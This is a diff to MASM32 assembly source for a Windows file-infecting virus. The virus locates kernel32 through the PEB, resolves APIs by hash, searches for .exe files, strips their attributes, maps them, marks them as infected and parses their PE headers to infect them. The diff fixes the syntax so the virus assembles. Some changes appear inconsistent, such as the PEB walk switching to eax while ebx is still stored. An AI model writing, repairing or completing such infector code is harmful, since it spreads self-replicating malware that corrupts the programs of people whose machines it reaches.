@@ -2,6 +2,7 @@
 .model flat, stdcall
 option casemap:none
 
+assume nothing
 include \masm32\include\windows.inc
 include \masm32\include\kernel32.inc
 include \masm32\include\user32.inc
@@ -20,26 +21,26 @@ includelib \masm32\lib\user32.lib
   virSize equ virEnd - virStart
 
 Kernel_APIs struct
-    ACloseHandleA dd 4F6CEA0Bh
-    ACreateFileAA dd AAC4A387h
-    ACreateFileMappingAA dd 4BE46D93h
-    AExitProcessA dd DAEF6833h
-    AFindFirstFileAA dd 36142A31h
-    AFindNextFileAA dd 8AD8D6B7h
-    AFlushViewOfFileA dd 68865B91h
-    AGetFileAttributesAA dd CF9FE3E3h
-    AGetFileTimeA dd C05002B5h
-    ALoadLibraryAA dd C03E4272h
+    ACloseHandleA dd 04F6CEA0Bh
+    ACreateFileAA dd 0AAC4A387h
+    ACreateFileMappingAA dd 04BE46D93h
+    AExitProcessA dd 0DAEF6833h
+    AFindFirstFileAA dd 036142A31h
+    AFindNextFileAA dd 08AD8D6B7h
+    AFlushViewOfFileA dd 068865B91h
+    AGetFileAttributesAA dd 0CF9FE3E3h
+    AGetFileTimeA dd 0C05002B5h
+    ALoadLibraryAA dd 0C03E4272h
     AMapViewOfFileA dd 5764C7D0h
-    ASetEndOfFileA dd DAE64EA5h
-    ASetFileAttributesAA dd EA9468FDh
+    ASetEndOfFileA dd 0DAE64EA5h
+    ASetFileAttributesAA dd 0EA9468FDh
     ASetFilePointerA dd 1038158Bh
-    ASetFileTimeA dd DE7FB5FCh
-    AUnmapViewOfFileA dd C6E54950h
+    ASetFileTimeA dd 0DE7FB5FCh
+    AUnmapViewOfFileA dd 0C6E54950h
 Kernel_APIs ends
 
 User_APIs struct
-    AMessageBoxAA dd A8D2A271h
+    AMessageBoxAA dd 0A8D2A271h
 User_APIs ends
 
 .code
@@ -53,12 +54,12 @@ CodeStart:
   sub ebp, CodeStart
 
   ;;Retrieve the base address of kernel32.dll
-  mov ebx, dword ptr fs:[30h]
-  mov ebx, [ebx + 0Ch]
-  mov ebx, [ebx + 14h]
-  mov ebx, [ebx]
-  mov ebx, [ebx]
-  mov ebx, [ebx + 10h]
+  mov eax, [fs:30h]
+  mov eax, [eax + 0Ch]
+  mov eax, [eax + 14h]
+  mov eax, [eax]
+  mov eax, [eax]
+  mov eax, [eax + 10h]
   mov eax, dwKernelBase
   add eax, ebp
   mov dword ptr [eax], ebx
@@ -74,7 +75,7 @@ CodeStart:
   pop ebp
   lea edx, [ebp+szUser32]
   push edx
-  call [ebx+36]
+  call DWORD ptr [ebx+36]
   mov edx, eax
   lea edi, [ebp+User_APIs]
   xor ecx, ecx
@@ -90,17 +91,17 @@ infectFirstFile:
   push esp
   lea edx, [ebp+szExe]
   push edx
-  call [ebx+16]
+  call dword ptr [ebx+16]
   inc eax
   jz endInfection
   dec eax
-  mov dword [esp+320], eax
+  mov dword ptr [esp+320], eax
 
 infectNextFile:
   call infectFile 
   push esp 
-  push dword [esp + 324]
-  call [ebx+20]
+  push dword ptr [esp + 324]
+  call dword ptr [ebx+20]
   test eax, eax
   jnz infectNextFile
 
@@ -112,11 +113,11 @@ endInfection:
   lea edx, [ebp + szTitle]
   push edx
   push 0
-  call [ebx+64]
-  cmp dword [ebp + backToHost + 1], 'inf'
+  call  dword ptr [ebx+64]
+  cmp dword ptr [ebp + backToHost + 1], 'inf'
   jne returnToHost
   push 0
-  call [ebx+12]
+  call dword ptr [ebx+12]
 
 returnToHost: 
   add esp, 68
@@ -132,17 +133,17 @@ infectFile:
   sub esp,48h
   push ebp
   lea ebp,[esp+4h]  
-  mov edx , dword [ebp+34h+WIN32_FIND_DATA.nFileSizeLow]
+  mov edx , dword ptr [ebp+34h+WIN32_FIND_DATA.nFileSizeLow]
   mov [ebp+0h] , edx
   mov [ebp+2Ch] , edx
-  add dword [ebp+0h] , virSize+1000h    ;fileSize+virSize+extra work space
+  add dword ptr [ebp+0h] , virSize+1000h    ;fileSize+virSize+extra work space
   lea esi , [ebp+34h+WIN32_FIND_DATA.cFileName]
   push esi
-  call [ebx+28h]         ;save original attributes 
-  mov [ebp+4h] , eax
-  push dword 80h
+  call dword ptr [ebx+28h]         ;save original attributes 
+  mov dword ptr [ebp+4h] , eax
+  push dword ptr 80h
   push esi
-  call [ebx+48h]         ;set to normal , ie clear all attributes
+  call dword ptr [ebx+48h]         ;set to normal , ie clear all attributes
   xor edi,edi
   push edi
   push edi
@@ -151,41 +152,41 @@ infectFile:
   push edi
   push 0C0000000h
   push esi
-  call [ebx+4h]
+  call dword ptr[ebx+4h]
   inc eax
   jz done
   dec eax
-  mov dword [ebp+8h] , eax
-  lea edx , [ebp+Ch]
+  mov dword ptr [ebp+8h] , eax
+  lea edx , dword ptr [ebp+Ch]
   push edx
   add edx,8h
   push edx
   add edx,8h
   push edx
   push eax
-  call [ebx+32h]
+  call dword ptr [ebx+32h]
   push edi
-  push dword [ebp+0h]
+  push dword ptr [ebp+0h]
   push edi
   push 4
   push edi
-  push dword [ebp+8h]
-  call [ebx+8h]
+  push dword ptr [ebp+8h]
+  call dword ptr [ebx+8h]
   mov [ebp+24h] , eax
-  push dword [ebp]
+  push dword ptr [ebp]
   push edi
   push edi
   push 2
-  push dword [ebp+24h]
-  call [ebx+40h]
+  push dword ptr [ebp+24h]
+  call dword ptr [ebx+40h]
   mov esi,eax
   mov edi,eax
   mov [ebp+28h] , eax
-  cmp word [esi] , 'MZ'
+  cmp word ptr [esi] , 'MZ'
   jne UnMap
-  cmp byte [esi+50h] , 't'    ;already infected ?
+  cmp byte ptr [esi+50h] , 't'    ;already infected ?
   je UnMap
-  mov byte [esi+50h] , 't'    ;marked
+  mov byte ptr [esi+50h] , 't'    ;marked
   add esi , [esi+3Ch]
   cmp word [esi] , 'PE'
   jne UnMap
